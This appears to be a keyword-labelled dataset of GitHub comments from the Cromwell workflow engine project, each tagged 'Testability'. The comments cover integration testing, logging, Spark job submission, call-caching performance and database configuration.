Testability,"@geoffjentry ; **Prerequisite**: We have Spark cluster (3 nodes = 1 master, rest worker including master), Docker on all three nodes, Hdfs file system (3 nodes = 1 Namenode, rest Data nodes including NN) Spark app build locally in Docker repository. This app (spark_hdfs.jar) has two main entry points 1) Word count 2) Vowel count as main class. App consumes input available on Hdfs (assumption pre-loaded) and produces output to Hdfs. . **WDL:**. ```; task spark {; command {; /opt/spark/spark-1.6.1-bin-hadoop2.6/bin/spark-submit --class com.intel.spark.poc.nfs.SparkVowelLine --master spark://10.0.1.22:7077 /app/spark_hdfs.jar hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output; }. output {; File empty = stdout(); }. runtime {; docker: ""sparkapp""; }. }. workflow test {; call spark; }. ```. So the app is available inside the docker container that has base image with Spark environment(i.e. Spark driver + hadoop connector) that will connect to Spark master on host machine within the cluster to submit job, reads input from hdfs file system and turn them into RDDs and distribute the work to workers with the help of master and at the end write output to hdfs. . Following are the arguments to the app ; `hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660:668,test,test,668,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660,3,['test'],['test']
Testability,"@geoffjentry ; I trying to write some kind of integration test for my fix of this task and me with @TimurKustov came to idea of executing two workflows sequential in order to get outputs, results and call logs copied after execution of the first workflow and assure that they are exist and correctly placed by running second workflow, which would check these files locations and existence.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-520024075:58,test,test,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-520024075,2,"['log', 'test']","['logs', 'test']"
Testability,"@geoffjentry @cjllanwarne changes have been applied. I added tests for ""read_from_cache"" and ""write_from_cache"" too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164845098:61,test,tests,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164845098,1,['test'],['tests']
Testability,@geoffjentry @scottfrazer It seems the parser is validating memory runtime attribute entry when it tries to load namespaces.; I think it should be removed to follow the current idea.; This is the link to the code that is causing related test to fail (look for ignore word in the PR) => https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/RuntimeAttributes.scala; Let me know how to proceed with this...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369:237,test,test,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369,1,['test'],['test']
Testability,@geoffjentry Closing this issue. I think I figured out what happened and it is okay. Very hard to decipher from log messages.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1970#issuecomment-278996765:112,log,log,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1970#issuecomment-278996765,1,['log'],['log']
Testability,"@geoffjentry Could you also please help with another question about `*.test` files: is it possible to run multiple separate workflows (wdl or cwl) in one test? Not importing as sub-workflows, but as a completely independent workflows?; Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519841408:71,test,test,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-519841408,2,['test'],['test']
Testability,@geoffjentry Could you pls check that the test passes on this branch for you ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/473#issuecomment-188389370:42,test,test,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/473#issuecomment-188389370,1,['test'],['test']
Testability,"@geoffjentry I *think* this is coincidence (I'm trying to debug presumably unrelated `after` problems), but it's quite possible that those tests hit my ""stalled"" condition too since they appear to be showing the same symptoms. In which case we might get some more useful debug clues out of this",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4486#issuecomment-446341396:139,test,tests,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4486#issuecomment-446341396,1,['test'],['tests']
Testability,@geoffjentry I didn't dig into to the root cause of the error. I launched two Cromwell servers (via the cfn template on the AWS docs page) against the same AWS Batch setup and tested a hello world wdl.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-516195804:176,test,tested,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-516195804,1,['test'],['tested']
Testability,@geoffjentry I grabbed a log of ctl-\ into a file ``screenlog.0`` and I confirmed that the entire output was there. Unfortunately...; ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$ egrep evaluateOutputs screenlog.0. lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$. ```. ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$ egrep ExecutionActor screenlog.0. lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$. ```. ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$ egrep -i postProcess screenlog.0. lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq$. ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1917#issuecomment-275690267:25,log,log,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1917#issuecomment-275690267,1,['log'],['log']
Testability,@geoffjentry I ran into the same problem with `long_cmd` when I made the same mistake of using a non-CI config during horicromtal testing. Some lessons learned [here](https://github.com/broadinstitute/cromwell/pull/4748/files).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473341426:130,test,testing,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473341426,2,['test'],['testing']
Testability,"@geoffjentry I ran this wdl on local backend, call caching off, and I mocked the backend response to immediately return success instead of running the job. So all jobs finish immediately and at the same time. It's not a realistic use case but it's an easy way to push cromwell hard in terms of execution performance for large scatter. ```; task hello {; String addressee; command {; echo ""Hello ${addressee}!""; }; runtime {; docker: ""ubuntu""; }; }. workflow wf_hello {; String wf_hello_input = ""world""; Array[Int] s = range(200000); scatter (i in s) {; call hello {input: addressee = wf_hello_input }; }; }; ```. Here are the results:. | Branch | JobStore Writes | ExecutionTime |; |------------|-----------------|-------------------------------------------------------------|; | Develop | On | Still computing runnable calls after 30' - no shard started |; | ThisBranch | On | 8' |; | ThisBranch | Off | 1'30"" |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274:70,mock,mocked,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274,1,['mock'],['mocked']
Testability,"@geoffjentry I'll rephrase:; - I agree that the `size` function's interaction with the outside world deserves a centaur test (and I believe it has one).; - Since this PR only adds functionality that's entirely internal to Cromwell, I don't think (even in a perfect world) that we need another `empty_optionals_size` test in centaur to make sure that empty optionals give a size of 0?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314423467:120,test,test,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314423467,2,['test'],['test']
Testability,"@geoffjentry I'm working on JES unit test cases now... which are the cases validation should fail if entry is not present?; Let's say Docker entry is not provided in RuntimeAttributes, should validation fails in this case for JES?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300:37,test,test,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212170300,1,['test'],['test']
Testability,"@geoffjentry It wasn't yet, AFAIK you need a branch to test stuff on the perf env so I thought I'd make a PR of it already and test it in the meantime. We could also leave the current value of 100 and merge this which would have no change in behavior and then tune the value if necessary with benchmarks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111:55,test,test,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111,3,"['benchmark', 'test']","['benchmarks', 'test']"
Testability,"@geoffjentry Looking for some clarification; are you suggesting that all logging be removed from `whenUnhandled` handlers, or logging in specific cases within the `whenUnhandled` handler (e.g. [here](https://github.com/broadinstitute/cromwell/blob/8b4fd5d847b724d3b2383c1d1b33826006867c9c/engine/src/main/scala/cromwell/engine/workflow/lifecycle/materialization/MaterializeWorkflowDescriptorActor.scala#L207)? Or am I completely off-track?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430020117:73,log,logging,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430020117,2,['log'],['logging']
Testability,"@geoffjentry That makes sense, thanks. Given the current code structure it's not at all clear to me how Docker-dependent branching would fit in - maybe this would be easier as a boolean configuration option adjacent to `workflow-log-dir`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4499#issuecomment-562687693:229,log,log-dir,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4499#issuecomment-562687693,2,['log'],['log-dir']
Testability,"@geoffjentry The main advantage of running these test cases daily vs weekly seems to be that it’s easier to narrow down which change couldve caused this test suite to fail. However, it seems unlikely to me that these tests could find breaking changes everyday that the centaur standard test cases wouldn’t already uncover. I see these tests as a release requirement for Cromwell more than anything else. However, it’s totally upto the team on whatever makes them most comfortable, I don’t have a strong opinion on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3066#issuecomment-352073368:49,test,test,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3066#issuecomment-352073368,5,['test'],"['test', 'tests']"
Testability,"@geoffjentry This is a proper text file format, IMHO ... Also, think about support down the road - the error message that goes with this is pretty cryptic (it's a giant stack trace buried in other error messages and the log message gets clobbered by stdout/stderr contention). Unless it is a lot of work, would you guys be willing to address it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1876#issuecomment-273793770:220,log,log,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1876#issuecomment-273793770,1,['log'],['log']
Testability,"@geoffjentry Very nice, thanks for the link! Wish I did know this earlier... :+1: ; Could this file then be provided to `cromwell` when running integration test via `centaur`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5105#issuecomment-519570433:156,test,test,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5105#issuecomment-519570433,1,['test'],['test']
Testability,@geoffjentry We could certainly move the token dispenser into a per-BE model (and then only have one tokenPool to make the logic simpler. Hooray!). Also FWIW I don't believe the EJEA is a hairball. It's just getting large enough to merit decomposing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1500#issuecomment-250574493:123,log,logic,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1500#issuecomment-250574493,2,['log'],['logic']
Testability,@geoffjentry What benefit does the AsyncAppender have for our logs? How realistic is the risk that some messages could be dropped?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910:62,log,logs,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329481910,1,['log'],['logs']
Testability,@geoffjentry Within the workflow actor? I don't know how concurrent the tests are but they aren't crazy - I can imagine a scatter going wider than our test cases,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224:72,test,tests,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224,2,['test'],"['test', 'tests']"
Testability,"@geoffjentry Yeah so I actually changed the fix because @cjllanwarne suggestion seemed cleaner and I though it would have the same effects, but apparently it doesn't. I can change it back to the first version that worked for you.; On a larger point, I think (hope) this kind of failures will be a lot less happening when we re-factor the test suite infrastructure. IMO it's happening because we keep doing more and more complex tricks in the spec to get it to do what we need but with all the features we keep adding it keeps getting less and less stable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/466#issuecomment-188299463:338,test,test,338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/466#issuecomment-188299463,1,['test'],['test']
Testability,"@geoffjentry Yeah, I have also hit my share of obscure errors over time in my applications, though by that time the failure-recovery rules usually kicked in to keep the system in a running state, with the periodic subsequent log monitoring and analysis in case certain edge-cases become more prevalent. It is great to hear about the shift towards scaling being explored for the near future, but I think you might have made things unnecessarily hard for yourself. Usually it is much easier to have scaling be built-in from the start into the application, and then tuning through metric-based scaling policies the application-triggered scaling rules, which can be bounded by appropriate upper limits before, or interactively after application deployment. This way one has the benefits of both worlds - controlling costs with scalability capabilities for satisfying possible capacity/performance requirements - but I am sure you are already aware of that as well :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235:225,log,log,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235,1,['log'],['log']
Testability,"@geoffjentry alright, alright, no need to get [testy](https://www.merriam-webster.com/dictionary/testy)...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3971#issuecomment-410758274:47,test,testy,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3971#issuecomment-410758274,2,['test'],['testy']
Testability,"@geoffjentry from inspecting logs and AWS Batch console, i think what is happening is that the jobs fail because Cromwell shutdowns the VMs earlier than expected. So one of shard hasn't finished and is unable to upload to S3, hence the problem here occurs. Anyways this is a hypothesis based on what I saw, hopefully is helpful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-522343642:29,log,logs,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-522343642,1,['log'],['logs']
Testability,@geoffjentry have you continued to see many logs as drowning performance? It sounds like optimizing logs could give us a large bump in scale!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648:44,log,logs,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648,2,['log'],['logs']
Testability,@geoffjentry is this Epic still useful?; @ndbolliger this Epic has tickets related to testing that I made after we talked with you the first time,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2109#issuecomment-329663337:86,test,testing,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2109#issuecomment-329663337,1,['test'],['testing']
Testability,@geoffjentry is this still a useful ticket? Are there still PostMVP tests or have they been cleaned up in the last year?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1149#issuecomment-320692423:68,test,tests,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1149#issuecomment-320692423,1,['test'],['tests']
Testability,"@geoffjentry my understanding is that the logic here is what we want but the interface could be a little better, and a little more fully implemented. Correct me if I'm wrong, but I _think_ we want all `DataAccess` methods to automatically (and transparently) have deadlock retries. If we were to do that for all methods in `DataAccess` using the scheme laid out in this PR, then we'd be duplicating all of the methods in `DataAccess`. Perhaps we could construct `DataAccess` with an `ActorSystem`... though I can't remember if @kshakir objected to this for a reason that is currently escaping me. We could also just make the whole thing an actor, or put an actor in front of `DataAccess`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/690#issuecomment-208340703:42,log,logic,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/690#issuecomment-208340703,1,['log'],['logic']
Testability,"@geoffjentry no, in fact the test I took screenshots from is a filename collision test, notice they're both name `out.txt`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-379322151:29,test,test,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3474#issuecomment-379322151,2,['test'],['test']
Testability,"@geoffjentry not sure here, the spec it not ruling this out but also not say explicitly it's possible. The idea is to keep the same kind of struct for the optional and non optional outputs like this:; ```; struct IndexedFile {; File file; File index; }. task Test {; output {; IndexedFile file1 = ""some file""; IndexedFile? file2 = ""some other file""; }; }; ```. In this case once having a struct both field should be there. Also the other option should require 2 structs to be there, this only require 1 schema/struct.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4111#issuecomment-422569074:259,Test,Test,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4111#issuecomment-422569074,1,['Test'],['Test']
Testability,"@geoffjentry prior to today I wasn't aware of the new labels functionality. I believe this will be the solution, but have not tested it! I will let you know once I've seen the output",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313569884:126,test,tested,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313569884,1,['test'],['tested']
Testability,"@geoffjentry sounds good.; I'm going to close this as I'm rebasing, cleaning up a little, fixing or tagging failing tests, creating a centaur branch with disabled failing tests etc... I'll reopen a new PR on a separate branch when ready",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2613#issuecomment-328934905:116,test,tests,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2613#issuecomment-328934905,2,['test'],['tests']
Testability,"@geoffjentry sounds like this will be necessary in a CaaS world, do you agree?. As a **FC/GOTC developer**, I want **Cromwell to test with Cloud SQL after every release**, so that I can **avoid critical (? @helgridly a bug in Cloud SQL would be critical, right?) regressions and issues in production**.; - Effort: **Medium**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302:129,test,test,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1726#issuecomment-328536302,1,['test'],['test']
Testability,"@geoffjentry thanks for the quick reply! I am using now scatter and it works pretty well, meaning that multiple samples are running in parallel for the same task.. My question is: how many samples the scatter can run simultaneously? As a test am doing with 2 samples and they both run at the same time.. but am wondering if there is a limit (e.g. 100 or 200 etc..). This will help me to understand the time of the run of my entire workflow. Thanks in advance for any reply",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513919982:238,test,test,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513919982,1,['test'],['test']
Testability,"@geoffjentry the . > Extra logging around unexpected keys. commit was the key:. <img width=""1316"" alt=""screen shot 2017-04-05 at 12 13 07 pm"" src=""https://cloud.githubusercontent.com/assets/13006282/24715464/6515445e-19f9-11e7-9c54-34698bfe9d87.png"">. Before moving that message send I was seeing that programming error appear as a rare race condition (but often enough to fail a few sbt tests every time). I think my mistake was that the `createResponseSet` wasn't necessarily called from a `receive` method so akka was quite at liberty to interleave it with calls to `fulfillOrLog`, which I had assumed would be impossible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185:27,log,logging,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185,2,"['log', 'test']","['logging', 'tests']"
Testability,@geoffjentry the travis build is failing because some error handling has changed and so 2 refresh token centaur tests are failing--they should go green once you're rebased onto develop.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1438#issuecomment-248945902:112,test,tests,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1438#issuecomment-248945902,1,['test'],['tests']
Testability,"@geoffjentry what are unhandled messages, and why do we explicitly log them?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328885838:67,log,log,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328885838,1,['log'],['log']
Testability,"@geoffjentry what kind of effort do you think it would take to color-code parts of the logs? ; Obviously we would not get it all done with the first go, but I bet @knoblett could list the top 5 things she would like colored for easier logging.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-332957318:87,log,logs,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-332957318,2,['log'],"['logging', 'logs']"
Testability,@geoffjentry what would be the effort for testing this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2411#issuecomment-333239831:42,test,testing,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2411#issuecomment-333239831,1,['test'],['testing']
Testability,"@geoffjentry yes, this is turning the knob higher and hoping for the best. The downstream tests succeeded except for the one that depended on cross-talking with the failed test...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4525#issuecomment-452358458:90,test,tests,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4525#issuecomment-452358458,2,['test'],"['test', 'tests']"
Testability,"@geoffjentry, thanks for the answer :); Actually, we tried to do something similar to how it was done in GCP (or TES) but it didn't work out. We added logging to the `mapCommandLineWomFile` method so that we can see what `womFiles` Cromwell passes to this method. And it turns out Cromwell never passes ""ad hoc"" files to this method, therefore `asAdHocFile`, for example, always returns `None`. In particular, in our integration test (PR #5057) it passes only two womFiles with values something like ; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test`; and; `s3://bucket-name/cromwell-execution/cwl_temp_file_some-numbers.cwl/some-numbers/call-test/tmp.59740063`; I'm not sure, but it looks like the first `womValue` somehow related to the `runtimeEnvironment` field in the `StandardAsyncExecutionActor`. The second value is something else too, since ""ad hoc"" files are placed in `call-test` directory.; It is possible that we misunderstood something, but for now, it looks like a dead-end.; By the way, we also tried to override `localizeAdHocValues` method `AwsBatchAsyncBackendJobExecutionActor` so that it would copy ""ad hoc"" files to the ""/cromwell_root"" directory. It fails with an AccessDeniedException.; I hope this gives you an understanding of why we came to the proposed solutions. As I said, perhaps we misunderstood something, so we will be happy if you can give us some hint.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587:151,log,logging,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4586#issuecomment-509765587,5,"['log', 'test']","['logging', 'test']"
Testability,"@grsterin @aednichols if not an adapter from the old config, I do think a stub which throws an exception saying ""you need to update your config"" or something similar would be better than users suddenly getting cryptic errors like `""Class not found: x.y.z""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579501948:74,stub,stub,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579501948,1,['stub'],['stub']
Testability,"@grsterin added support for the updated backend and tested with the same workflow/inputs as above, but using the new backend and all seems to be well. Thanks for taking a look at this!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5353#issuecomment-582120445:52,test,tested,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5353#issuecomment-582120445,1,['test'],['tested']
Testability,@helgridly could you send me the WDL and inputs that failed so I can try to recreate this? I'm curious what's missing from our `write_lines_files` test case: (https://github.com/broadinstitute/centaur/blob/develop/src/main/resources/standardTestCases/write_lines_files/write_lines_files.wdl),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-311714438:147,test,test,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-311714438,1,['test'],['test']
Testability,@horneth do you still have the testing environment you were using for scale stuff recently? I'd be curious to see a before & after just to make sure there's not something else lurking here besides that one bug,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2104#issuecomment-290064284:31,test,testing,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2104#issuecomment-290064284,1,['test'],['testing']
Testability,"@huangzhibo ; you may want to check if you see this:; ```; MariaDB [(none)]> SELECT @@SQL_MODE;; +-------------------------------------------------------------------------------------------+; | @@SQL_MODE |; +-------------------------------------------------------------------------------------------+; | STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |; +-------------------------------------------------------------------------------------------+; 1 row in set (0.000 sec); ```; as this is the default setup for some linux distros. I get your exact error, and also #3346 with the above SQL_MODE. In https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457 it is suggested to try setting; ```; MariaDB [(none)]> SET GLOBAL sql_mode = 'ANSI_QUOTES';; Query OK, 0 rows affected (0.000 sec); ```; When I do that, both errors no longer occur. Note the above change is not permanent. You can alter; `/etc/my.cnf.d/mariadb-server.cnf`; to something like; ```; [mysqld]; datadir=/var/lib/mysql; socket=/var/lib/mysql/mysql.sock; log-error=/var/log/mariadb/mariadb.log; pid-file=/run/mariadb/mariadb.pid; sql_mode=ANSI_QUOTES; ```; and then restart your db server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438418031:1087,log,log-error,1087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4382#issuecomment-438418031,3,['log'],"['log', 'log-error']"
Testability,"@ichengchang are we confident that INFO-level logs show up in Kibana?. Should be very easy to check, simply identify a single INFO entry in Kibana that came from Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-511471851:46,log,logs,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5065#issuecomment-511471851,2,['log'],['logs']
Testability,"@illusional ; I am happy you like this change. I have checked your other post in #4945 and your use case is similar to ours. We use a SGE cluster and run cromwell from the login node. The message is really easy to implement. But I am not sure what would be the right way to tackle this. I would like some consistency with the other localization methods, and I don't know if they message when a file is being copied. I haven't tested cached-copy in conjunction with call-caching and path+modtime yet. If I find issues with it I will create a new issue on the cromwell issue tracker, ping you, and see if I can fix it in a PR. We rely heavily on the path+modtime strategy as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522:172,log,login,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522,2,"['log', 'test']","['login', 'tested']"
Testability,"@illusional it looks like you're changing the global behavior of `+` with respect to optional strings, whereas the spec is asking specifically within interpolations. That discrepancy between ""ok in interpolations"" and ""not ok outside interpolations"" is usually handled by catching the `OptionalNotSuppliedException` in the interpolation logic and replacing the entire output with an empty string. I don't know for sure why that's not working in this case but that would be my first suggestion on where to look",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-662051248:337,log,logic,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5583#issuecomment-662051248,1,['log'],['logic']
